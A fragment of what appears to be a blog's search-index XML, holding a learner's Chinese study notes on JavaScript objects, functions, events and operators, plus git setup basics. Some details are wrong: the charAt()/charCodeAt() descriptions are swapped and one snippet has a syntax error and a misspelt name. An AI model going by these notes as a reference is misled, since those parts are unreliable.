class="line">&#123;</span><br><span class="line">this.name = name;</span><br><span class="line">this.year = year;</span><br><span class="line">&#125;</span><br><span class="line">var fred = new chronicle(&quot;Year&quot;,2007);</span><br><span class="line">alert(fred.constructor);//显示对象中的函数代码</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h4 id="prototype属性"><a href="#prototype属性" class="headerlink" title="prototype属性"></a>prototype属性</h4><ul><li>可以为对象添加属性和方法</li><li>object.prototype.name &#x3D; value<ul><li>object 对象名or字符串变量</li><li>name 要添加的属性名</li><li>value 添加的属性值</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function personnel(name.age)</span><br><span class="line">&#123;</span><br><span class="line">this.name = name;</span><br><span class="line">this.age = age;</span><br><span class="line">&#125;</span><br><span class="line">var information = new personnel(&quot;张三哦&quot;, 27);</span><br><span class="line">personel.prototype.salary = null;//向对象中添加属性，书上是这样写得但是这个是个类啊，对象应该是information才对</span><br><span class="line">information.salary = 1700;</span><br><span class="line">alert(information.salary);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="String-对象的方法"><a href="#String-对象的方法" class="headerlink" title="String 对象的方法"></a>String 对象的方法</h4><p>|方法|说明|<br>|-:-|-:-|<br>|anchor()|创建HTML锚|<br>|big()|使用大号字体显示字符串|<br>|small()|使用小号字体显示字符串|<br>|fontsize()|使用指定的尺寸来显示字符串|<br>|bold()|使用粗体来显示字符串|<br>|italics()|使用斜体来显示字符串|<br>|link()|将字符串显示为链接|<br>|strike()|使用删除线来显示字符串|<br>|blink()|显示闪动字符串，该方法不支持IE浏览器|<br>|fixed()|以打字机文本显示字符串|<br>|charAt()|返回指定位置的字符（返回的字符编码）|<br>|charCodeAt()|返回指定位置的字符（返回的是字符子串）|<br>|concat()|连接字符串|<br>|fontcolor()|使用指定颜色来显示字符串|<br>|fromCharCode()|从字符编码创建一个字符串|<br>|indexOf()|检索字符串|<br>|lastIndexOf|从后向前搜索字符串|<br>|localeCompare|用本地特定的顺序来比较两个字符串|<br>|match()|在字符串内检索指定的值或找到一个或多个与正则表达式相匹配的文本|<br>|repalce()|替换与正则表达式匹配的子串|<br>|search()|检索与正则表达式相匹配的值|<br>|split()|把字符串分割为字符串数组|<br>|substr()|从起始索引号提取字符串中指定数目的字符|<br>|substring()|提取字符串中两个指定的索引号之间的字符|<br>|slice()|提取字符串的片段并在新的字符串中返回被提取的部分|<br>|sub()|把字符串显示为下标|<br>|sup()|把字符串显示为上标|<br>|toLocaleLowerCase()|按照本地方式把字符串转换为小写|<br>|toLocaleUpperCase()|按照本地方式把字符串转换为大写|<br>|toLowerCase()|把字符串转换为小写|<br>|toUpperCase()|把字符串转换为大写|<br>|toSource()|代表对象的源代码|<br>|valueOf()|返回某个字符串对象的原始值|</p><h2 id="Date对象"><a href="#Date对象" class="headerlink" title="Date对象"></a>Date对象</h2><ul><li>用于在网页中实现时间日期</li></ul><h3 id="创建Date对象"><a href="#创建Date对象" class="headerlink" title="创建Date对象"></a>创建Date对象</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dataObj = new Date();</span><br><span class="line">dateObj = new Date(dateVal);</span><br><span class="line">dateObj = new Date(year, month, date[,hours[,minutes[,seconds[,ms]]]]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>|参数|说明|<br>|-:-|-:-|<br>|dateObj|必选项，要赋值为Date对象的变量名|<br>|dateVal|必选项，如果是数字，从1970年1月1日计算，如果字符串，按parse方法中的规则解析，也可以从某些ActiveX(R)对象返回的VT_DATE值|<br>|year|必选项，需要完整年份如1970|<br>|month|必选项，0-11之间|<br>|date|必选项，1-31之间|<br>|hours|可选，有下级必选，0-23|<br>|minutes|可选，0-59|<br>|seconds|可选，0-59|<br>|ms|可选，0-999|</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var newDate = new Date(&quot;Jan 2,2008 19:41:40&quot;);</span><br><span class="line">document.write(newDate);</span><br><span class="line"></span><br><span class="line">//运行结果 Wed Jan 2 19:41:40 UTC+0800 2008</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Date对象的属性"><a href="#Date对象的属性" class="headerlink" title="Date对象的属性"></a>Date对象的属性</h3><ul><li>constructor</li><li>prototype</li><li>类似用法不讲解了</li></ul><h3 id="Date对象的方法"><a href="#Date对象的方法" class="headerlink" title="Date对象的方法"></a>Date对象的方法</h3><ul><li>好多啊不想打了，查吧</li><li>大致分为这几类<ul><li>Date()</li><li>get…()</li><li>parse()</li><li>set…()</li><li>to…()</li><li>UTC()</li><li>valueOf()</li></ul></li></ul><h2 id="event-对象"><a href="#event-对象" class="headerlink" title="event 对象"></a>event 对象</h2><ul><li>主要用来描述JavaScript的事件<ul><li>事件发生元素</li><li>键盘状态</li><li>鼠标位置</li><li>鼠标按钮状态</li></ul></li></ul><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><ul><li>IE中event可以全局引用例： event.propertyName</li><li>W3C 中引用event对象<ul><li>必须明确的将event作为参数传递到事件处理函数中</li><li>例： onKeyUp &#x3D; “example(this,event)” or function example(widget,event){…}</li><li>尽量避免event作为传入参数变量名</li></ul></li></ul><h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><ul><li>altLeft属性<ul><li>获取左alt键的当前状态，true为关闭，false不关闭 </li><li>[windows.]event.altLeft</li></ul></li><li>ctrlLeft属性</li><li>shiftLeft属性</li><li>button属性<ul><li>设置或获取事件发生时用户所按的鼠标键</li><li>[windows.]event.button</li><li>此属性仅用于onmousedown,onmouseup,onmousemove事件，其他事件都返回0</li></ul></li></ul><p>|button属性的值|说明|<br>|-:-|-:-|<br>|0|表示没有按键|<br>|1|按下左键|<br>|2|按下右键|<br>|3|同时按下左键和右键|<br>|4|按下中键|<br>|5|同时按下左中|<br>|6|同时按下右中|<br>|7|同时按下左中右|</p><ul><li>clientX 属性<ul><li>该属性获取鼠标在浏览器窗口中的X坐标，他是一个只读属性，即只能获取鼠标当前位置不能改变鼠标位置</li><li>[windows.]event.clientX</li></ul></li><li>clientY属性</li><li>X属性<ul><li>该属性设置或获取鼠标指针位置相对于CSS属性中有position属性的上级元素的X轴坐标。如果CSS属性中没有position属性的上级元素，默认以body元素作为参考对象</li><li>[windows.]event.X </li><li>如果鼠标事件触发后，鼠标移出窗口外，则返回的值为-1,。这是个只读属性，只能通过他获取鼠标当前位置，但不能用来改变鼠标位置。</li></ul></li><li>Y属性</li><li>cancelBubble属性<ul><li>检测是否接受上层元素的事件的控制。如果该属性的值是false,则允许被上层元素的事件控制；否则值为true,则不被上层元素的事件控制。</li><li>[windows.]event.cancelBubble[&#x3D; cancelBubble]</li><li>该属性的值为一个可读写的boolean,默认false</li></ul></li><li>srcElement属性<ul><li>用于设置或获取触发事件的对象</li><li>是事件初始目标的HTML元素对象引用</li><li>由事件通过元素容器层次进行处理，并可以在任意层次进行处理，因此由一个属性指向产生初始事件的元素很有帮助。</li></ul></li></ul><p>对象类型有点多，今天就写到这了，应该多编写代码而不是写心得，感觉打字是越来越熟练，但是打示例代码的速度还是有些慢。由于没有彻底学完HTML和CSS,javascript理解有些困难，所以暂且告一段落。待日后有时间再学习。</p>]]></content>
      
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript2</title>
      <link href="/2019/08/09/javascript2/"/>
      <url>/2019/08/09/javascript2/</url>
      
        <content type="html"><![CDATA[<h1 id="Javascript流程控制"><a href="#Javascript流程控制" class="headerlink" title="Javascript流程控制"></a>Javascript流程控制</h1><h2 id="选择语句"><a href="#选择语句" class="headerlink" title="选择语句"></a>选择语句</h2><h3 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h3><ul><li>类似C语言</li></ul><h3 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">switch(expression)&#123;</span><br><span class="line">case judgement 1:</span><br><span class="line">statement1;</span><br><span class="line">break;</span><br><span class="line">case judgement 2:</span><br><span class="line">statement2;</span><br><span class="line">break;</span><br><span class="line">...</span><br><span class="line">default:</span><br><span class="line">statement n;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><h3 id="while语句"><a href="#while语句" class="headerlink" title="while语句"></a>while语句</h3><ul><li>类Ｃ语言</li></ul><h3 id="dowhile语句"><a href="#dowhile语句" class="headerlink" title="dowhile语句"></a>dowhile语句</h3><h3 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for(i=1;i&lt;100;i+=1)&#123;</span><br><span class="line">sum = sum +i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="跳转语句"><a href="#跳转语句" class="headerlink" title="跳转语句"></a>跳转语句</h2><h3 id="continue语句"><a href="#continue语句" class="headerlink" title="continue语句"></a>continue语句</h3><ul><li>终止本次循环并开始下一次循环</li></ul><h3 id="break语句"><a href="#break语句" class="headerlink" title="break语句"></a>break语句</h3><ul><li>中断循环</li></ul><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function functionName(parameter 1,parameter 2,...)&#123;</span><br><span class="line">statements;</span><br><span class="line">[return expression]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h2><ul><li>通常函数定义在head中，通常会被在body段调用</li><li>如果定义前调用会出错</li><li>还可以通过链接调用函数<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">## 定义函数 test(),之后为调用过程</span><br><span class="line"></span><br><span class="line">&lt;a href= &quot;javascript:test();&quot;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h2 id="参数的使用"><a href="#参数的使用" class="headerlink" title="参数的使用"></a>参数的使用</h2><ul><li>定义函数时的参数叫做形参（用逗号分隔多个形参）</li><li>使用函数时提供的参数是实参（多个实参用逗号分隔）</li><li>定义了多少形参调用函数时就要使用多少实参（这里注意和python不太一样，Python中可以定义有限个形参，但是不一定使用它）</li></ul><h2 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h2><ul><li>可以将定义的函数返回一个值供其他程序段使用</li><li>return</li></ul><h2 id="嵌套函数"><a href="#嵌套函数" class="headerlink" title="嵌套函数"></a>嵌套函数</h2><ul><li>定义：在函数内定义函数</li><li>好处：内部函数可以得到外部函数的参数和全局变量</li><li>缺点：函数的可读性降低</li></ul><h2 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a>递归函数</h2><ul><li>函数体调用自身</li><li>容易造成死循环</li><li>定义递归函数的两个必要条件<ul><li>结束递归的条件</li><li>包括一个递归调用语句</li></ul></li></ul><h2 id="javascript中的内置函数"><a href="#javascript中的内置函数" class="headerlink" title="javascript中的内置函数"></a>javascript中的内置函数</h2><p>|函数|说明|<br>|-:-|-:-|<br>|eval()|求字符串中表达式的值|<br>|isFinite()|判断一个数值是否为无穷大|<br>|isNaN()|判断一个数值是否为NaN|<br>|parseInt()|将字符串转换为整型|<br>|parseFloat()|将字符型转换为浮点型|<br>|encodeURI()|将字符串转换为有效的URL|<br>|encodeURIComponent()|将字符串转换为有效的URL组件|<br>|decodeURI()|对encodeURL()编码的文本进行解码|<br>|decodeURIComponent()|对encodeURIComponent()编码的文本进行解码|</p><ul><li>使用示例<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">## 用于将首位数字字符串转换为数字，如果不是以数字开头会返回NaN</span><br><span class="line">parseInt(StringNum,[n])</span><br><span class="line"></span><br><span class="line">## 将首位为数字的字符串转换为浮点数，如果不是以数字开头会返回NaN</span><br><span class="line">parseFloat(StringNum)</span><br><span class="line"></span><br><span class="line">isNaN(Num)</span><br><span class="line">isFinite(Num)</span><br><span class="line">## 参数说明url需要转换为网络资源地址的字符串</span><br><span class="line"></span><br><span class="line">## URI和URL都可以表示网络资源地址，URI的表示范围更广泛，通常情况下两者是等同的,encodeURI()函数只对字符串中有意义的字符进行转义。如将字符串中的空格转换为&quot;%20&quot;</span><br><span class="line">encodeURI(url)</span><br><span class="line"></span><br><span class="line">## 将encodeURI()转码的网络资源地址转换为字符串并返回，decodeURI()是encodeURI的逆向操作</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h2 id="Function-构造函数和函数直接量"><a href="#Function-构造函数和函数直接量" class="headerlink" title="Function()构造函数和函数直接量"></a>Function()构造函数和函数直接量</h2><ul><li>构造函数Function()允许在运行时动态创建和编译JavaScript代码，而函数直接量却是程序构造的一个静态部分，就像函数语句一样</li><li>每次构造函数Function()时都会解析函数体，并创建一个新的函数对象。如果这个函数使用比较频繁则不推荐使用构造函数，会造成效率低下。而函数直接量不论是循环还是嵌套函数中，既不会每次调用重新编译，也不会每次遇到时都创建一个新的函数对象</li><li>Function()创建的函数使用的不是静态作用域，相反地，每次都当做顶级函数进行编译</li></ul><pre><code>## 通过自定义函数限制键鼠操作function maskingkeyboard()&#123;    if(event.keyCode==8)&#123;//判断是否为退格键        event.keyCode=0;        event.returnValue= false;        alert(&quot;当前设置不允许使用退格键&quot;);    &#125;    if(event.keyCode==13)&#123;//判断是否为回车键        event.keyCode=0;        event.returnValue= false;        alert(&quot;当前设置不允许使用回车键&quot;);    &#125;    if(event.keyCode==116)&#123;//判断是否为F5键        event.keyCode=0;        event.returnValue= false;        alert(&quot;当前设置不允许使用F5键&quot;);    &#125;    if((event.altKey)&amp;&amp;((window.event.keyCode==37)||(window.event.keyCode==39)))&#123;//判断是否为Alt+左右方向键        event.returnValue= false;        alert(&quot;当前设置不允许使用Alt+左右方向键&quot;);    &#125;        if((event.ctrlKey)&amp;&amp;(event.keyCode==78))&#123;//判断是否为ctrl+N        event.returnValue= false;        alert(&quot;当前设置不允许使用Ctrl+N &quot;);    &#125;    if((event.shiftKey)&amp;&amp;(event.keyCode==121))&#123;//判断是否为shift+F10组合键        event.returnValue= false;        alert(&quot;当前设置不允许使用shift+ F10&quot;);    &#125;&#125;function rightKey()&#123;//判断单击是否为鼠标右键    if(event.button == 2)&#123;        event.returnValue=false;        alert(&quot;禁止使用鼠标右键！&quot;);    &#125;&#125;##在html中body处插入键盘控制函数&lt;body onkeydown=&quot;maskingKeyboard()&quot;&gt;##在文档的onmousedown事件中调用rightKey()函数document.onmousedown=rightKey;//当鼠标右键被单击时调用rightKey()函数</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaScript1</title>
      <link href="/2019/08/08/javascript1/"/>
      <url>/2019/08/08/javascript1/</url>
      
        <content type="html"><![CDATA[<h1 id="javascript简介"><a href="#javascript简介" class="headerlink" title="javascript简介"></a>javascript简介</h1><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul><li>解释型语言</li></ul><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><ul><li>验证用户输入内容</li><li>动画效果</li><li>窗口应用</li><li>文字特效</li><li>jQuery</li><li>Ajax</li></ul><h2 id="html中的应用"><a href="#html中的应用" class="headerlink" title="html中的应用"></a>html中的应用</h2><h3 id="直接嵌入"><a href="#直接嵌入" class="headerlink" title="直接嵌入"></a>直接嵌入</h3><ul><li>《script》。。。《&#x2F;script》的方式嵌入内容</li></ul><h4 id="相关属性"><a href="#相关属性" class="headerlink" title="相关属性"></a>相关属性</h4><ul><li>因为vim中有JavaScript的用法所以这里用中文书名号代替尖括号，防止无法显示问题</li><li>《script language &#x3D; “JavaScript1.5”&gt;脚本语言类型及版本</li><li>《script src&#x3D; “01.js”&gt; 用以指定外部脚本路径，常用Javascript脚本，扩展名为.js</li><li>《script type &#x3D; “text&#x2F;javascript”&gt; 用于代替language</li><li>《script defer》 文档加载完毕后再执行脚本，用于加快网页加载速度<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; ... &lt;/script&gt;</span><br><span class="line">或者采用代码段方式编辑</span><br></pre></td></tr></table></figure></li></ul><h3 id="链接外部Javascript文件"><a href="#链接外部Javascript文件" class="headerlink" title="链接外部Javascript文件"></a>链接外部Javascript文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//方式说明</span><br><span class="line">&lt;script language = &quot;javascript&quot; src = &quot;javascript.js&quot;&gt; ... &lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>用这样的方式则可以按路径使用Javascript文件</li></ul><h2 id="JavaScript-语法"><a href="#JavaScript-语法" class="headerlink" title="JavaScript 语法"></a>JavaScript 语法</h2><h3 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h3><ul><li>顺序执行</li><li>如果需要在整个html文件中执行最好放在head中</li></ul><h3 id="大小写敏感"><a href="#大小写敏感" class="headerlink" title="大小写敏感"></a>大小写敏感</h3><ul><li>需要与html作对比，html没有大小写敏感</li></ul><h3 id="每行结尾分号可有可无"><a href="#每行结尾分号可有可无" class="headerlink" title="每行结尾分号可有可无"></a>每行结尾分号可有可无</h3><ul><li>建议还是加上吧</li></ul><h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><ul><li>首字符必须是字母，下划线美元符号</li><li>之后可以有数字</li></ul><h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><p>|—|—|—|—|—|—|<br>|-:-|-:-|:-|-:|–|–|<br>|abstract|continue|finally|instanceof|private|this|<br>|boolean|default|public|int|float|throw|<br>|break|do|for|interface|return|typeof|<br>|byte|double|function|long|short|true|<br>|case|else|goto|native|static|var|<br>|catch|extends|implements|new|super|void|<br>|char|false|import|null|switch|while|<br>|class|final|in|package|synchronized|with|</p><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const 常量名：数据类型=值；</span><br></pre></td></tr></table></figure><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><ul><li>声明<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var varible;</span><br></pre></td></tr></table></figure></li><li>可声明同时赋值</li><li>可同时声明赋值多个变量</li><li>变量只在脚本内起作用，而且也分为局部和全局变量</li></ul><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><ul><li>整型</li><li>进制不同0x十六进制，0八进制</li><li>浮点型</li><li>字符串</li><li>boolean</li></ul><h3 id="特殊数据类型"><a href="#特殊数据类型" class="headerlink" title="特殊数据类型"></a>特殊数据类型</h3><ul><li><p>转义字符<br>|转义字符|说明|<br>|-:-|-:|<br>|\b|退格|<br>|\n|回车换行|<br>|\t|tab|<br>|\f|换页|<br>|&#39;|单引号|<br>|&quot;|双引号|<br>|\v|跳格（tab水平）|<br>|\r|换行（光标位置和回车不同）|<br>|\|反斜杠|<br>|\OOO|八进制数|<br>|\xHH|十六进制数|<br>|\uhhhh|十六进制Unicode字符|</p></li><li><p>示例<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">document.writeln(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">document.writeln(&quot;轻松学习\nJavaScript语言！&quot;);</span><br><span class="line">document.writeln(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">运行结果为</span><br><span class="line">轻松学习</span><br><span class="line">JavaScript语言！</span><br></pre></td></tr></table></figure><br>  - 不使用pre转义字符不起作用</p></li><li><p>未定义值undefined和特殊数字常量NaN通常在数据类型转换后出现，因为其他的类型无法识别</p></li><li><p>空值null 注意不能等同于空字符串或者0</p></li></ul><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><ul><li>加减乘除</li><li>自增和自减（++，–）</li><li>求模</li></ul><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><ul><li>大于小于大于等于小于等于</li><li>&#x3D;&#x3D; 不判断数据类型，仅判断表面值</li><li>&#x3D;&#x3D;&#x3D; 绝对等于判断数据类型和表面值</li><li>!&#x3D;不判断数据类型，仅判断表面值</li><li>!&#x3D;&#x3D; 不绝对等于判断数据类型和表面值</li></ul><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><ul><li>&#x3D; 赋值</li><li>+&#x3D; </li><li>-&#x3D;</li><li>*&#x3D;</li><li>&#x2F;&#x3D;</li><li>%&#x3D;</li><li>&amp;&#x3D; 逻辑与</li><li>|&#x3D; 逻辑或</li><li>^&#x3D; 逻辑异或 a^&#x3D;b 相当于 a &#x3D; a^b</li></ul><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><table><thead><tr><th align="left">逻辑运算符</th><th>描述</th></tr></thead><tbody><tr><td align="left">!</td><td>取反</td></tr><tr><td align="left">&amp;&#x3D;</td><td>与之后赋值</td></tr><tr><td align="left">&amp;</td><td>逻辑与</td></tr><tr><td align="left">竖线&#x3D;</td><td>或之后赋值</td></tr><tr><td align="left">竖线</td><td>逻辑或</td></tr><tr><td align="left">^&#x3D;</td><td>异或之后赋值</td></tr><tr><td align="left">^</td><td>逻辑异或</td></tr><tr><td align="left">?:</td><td>三目运算符</td></tr><tr><td align="left">双竖线</td><td>或运算符</td></tr><tr><td align="left">&#x3D;&#x3D;</td><td>等于运算符</td></tr><tr><td align="left">!&#x3D;</td><td>不等于运算符</td></tr></tbody></table><h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><p>|位运算符|描述|<br>|-:-|:|<br>|&amp;|与运算符|<br>|竖线|或运算符|<br>|^|异或运算符|<br>|~|非运算符|<br>|左尖括号两个|左移|<br>|右尖括号两个|带符号右移|<br>|右尖括号三个|填0右移|</p><h2 id="typeof-运算符"><a href="#typeof-运算符" class="headerlink" title="typeof 运算符"></a>typeof 运算符</h2><ul><li>返回数据类型<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(typeof a);</span><br></pre></td></tr></table></figure></li></ul><h2 id="new-运算符"><a href="#new-运算符" class="headerlink" title="new 运算符"></a>new 运算符</h2><ul><li>创建一个新对象<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">new construct[(argument)]</span><br><span class="line">construct 构造函数</span><br><span class="line">argument 参数，可以无参</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git1</title>
      <link href="/2019/08/07/git1/"/>
      <url>/2019/08/07/git1/</url>
      
        <content type="html"><![CDATA[<h1 id="git"><a href="#git" class="headerlink" title="git"></a>git</h1><h2 id="git的作用"><a href="#git的作用" class="headerlink" title="git的作用"></a>git的作用</h2><ul><li>版本控制</li><li>多人开发协作方便<ul><li>协同修改</li><li>数据备份</li><li>版本管理</li><li>权限控制</li><li>历史记录</li><li>分支管理</li></ul></li></ul><h2 id="版本控制"><a href="#版本控制" class="headerlink" title="版本控制"></a>版本控制</h2><ul><li>集中式的版本控制工具<ul><li>SVN  存在服务器上</li><li>可能单点故障</li></ul></li><li>分布式的版本控制<ul><li>git 每台电脑都有一个版本库</li><li>解决单点故障问题</li></ul></li></ul><h2 id="git优势"><a href="#git优势" class="headerlink" title="git优势"></a>git优势</h2><ul><li>本地运行不需要联网</li><li>完整性保证</li><li>尽可能添加数据而不是删除ｏｒ修改数据</li><li>分支操作非常快</li><li>linux命令全面兼容</li></ul><h2 id="git分区"><a href="#git分区" class="headerlink" title="git分区"></a>git分区</h2><h3 id="工作区"><a href="#工作区" class="headerlink" title="工作区"></a>工作区</h3><ul><li>写代码</li></ul><h3 id="暂存区"><a href="#暂存区" class="headerlink" title="暂存区"></a>暂存区</h3><ul><li>临时储存</li></ul><h3 id="本地库"><a href="#本地库" class="headerlink" title="本地库"></a>本地库</h3><ul><li>历史版本</li></ul><h2 id="git和代码托管中心"><a href="#git和代码托管中心" class="headerlink" title="git和代码托管中心"></a>git和代码托管中心</h2><h3 id="代码托管中心"><a href="#代码托管中心" class="headerlink" title="代码托管中心"></a>代码托管中心</h3><ul><li>为了维护远程库 </li><li>局域网<ul><li>GitLab服务器</li></ul></li><li>外网<ul><li>GitHub</li><li>码云</li></ul></li></ul><h3 id="本地库和远程库"><a href="#本地库和远程库" class="headerlink" title="本地库和远程库"></a>本地库和远程库</h3><ul><li>本地库-远程库 push </li><li>远程库-本地库 clone</li><li>远程库1-远程库2 fork 相当于复制远程库1中的内容到远程库2中</li><li>远程库2-远程库1 pullrequest-审核-merge 将远程库2中更新的内容经过远程库1拥有者审核后合并进来</li></ul><h2 id="git命令行操作"><a href="#git命令行操作" class="headerlink" title="git命令行操作"></a>git命令行操作</h2><h3 id="本地库初始化"><a href="#本地库初始化" class="headerlink" title="本地库初始化"></a>本地库初始化</h3><ul><li>命令：git init </li><li>效果：创建了一个.git的隐藏目录</li><li>注意：.git 目录中存放的是本地库相关的目录和文件，不能删除和乱改</li></ul><h3 id="设置签名"><a href="#设置签名" class="headerlink" title="设置签名"></a>设置签名</h3><ul><li>形式<ul><li>用户名 tom</li><li>Email <a href="mailto:&#x67;&#x6f;&#x6f;&#x64;&#x6d;&#111;&#x72;&#x6e;&#x69;&#110;&#x67;&#64;&#x61;&#100;&#x66;&#97;&#x2e;&#99;&#x6f;&#109;">&#x67;&#x6f;&#x6f;&#x64;&#x6d;&#111;&#x72;&#x6e;&#x69;&#110;&#x67;&#64;&#x61;&#100;&#x66;&#97;&#x2e;&#99;&#x6f;&#109;</a></li></ul></li><li>区分不同版本开发人员的身份</li><li>辨析： 这里设置的签名和登录代码托管中心的账号密码无关</li><li>命令： <ul><li>项目级别&#x2F;仓库级别：仅在当前本地库有效<ul><li>git config user.name tom</li><li>git config user.email <a href="mailto:&#x61;&#x64;&#115;&#102;&#x61;&#x40;&#x61;&#115;&#100;&#102;&#x61;&#46;&#x63;&#x6f;&#109;">&#x61;&#x64;&#115;&#102;&#x61;&#x40;&#x61;&#115;&#100;&#102;&#x61;&#46;&#x63;&#x6f;&#109;</a></li><li>存储位置 仓库地址&#x2F;.git&#x2F;config文件中user节点处</li></ul></li><li>系统用户级别：在本系统的系统用户范围有效<ul><li>git config –global user.name tom_administrator</li><li>git config –global user.email <a href="mailto:&#x74;&#x6f;&#109;&#x5f;&#x61;&#100;&#109;&#105;&#x6e;&#x69;&#x73;&#116;&#114;&#97;&#116;&#x6f;&#114;&#64;&#x61;&#102;&#x61;&#x73;&#x61;&#x2e;&#x63;&#x6f;&#x6d;">&#x74;&#x6f;&#109;&#x5f;&#x61;&#100;&#109;&#105;&#x6e;&#x69;&#x73;&#116;&#114;&#97;&#116;&#x6f;&#114;&#64;&#x61;&#102;&#x61;&#x73;&#x61;&#x2e;&#x63;&#x6f;&#x6d;</a></li><li>储存位置 ~&#x2F;.gitconfig中user节点中</li></ul></li><li>优先级： <ul><li>就近原则：项目级别优先于系统用户级别，二者都有项目级别签名优先采用</li><li>不允许二者都没有</li></ul></li></ul></li><li>项目级别用户存放位置 cat .git&#x2F;config</li><li>系统用户级别用户存放位置<ul><li>cd ~</li><li>pwd</li><li>ls -la|less显示隐藏文件并分页显示</li><li>查看 .gitconfig</li></ul></li></ul><p></p>]]></content>
      
      
      
        <tags>
            
